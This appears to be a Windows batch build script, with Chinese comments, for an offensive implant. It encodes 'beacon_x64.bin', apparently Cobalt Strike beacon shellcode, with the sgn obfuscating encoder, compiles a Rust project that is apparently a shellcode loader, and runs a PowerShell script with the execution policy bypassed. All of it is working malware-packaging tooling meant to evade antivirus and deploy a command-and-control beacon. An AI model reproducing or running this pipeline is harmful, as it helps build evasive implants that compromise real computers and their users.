@echo off
:: 运行 sgn.exe 进行加密
sgn_windows_amd64_2.0.1\sgn.exe --arch=64 -S -i src\beacon_x64.bin -o src\encrypt.bin

:: 编译 Rust 项目
cargo build -r

:: 允许 PowerShell 脚本执行
powershell -ep bypass -File "%~dp0\script.ps1"
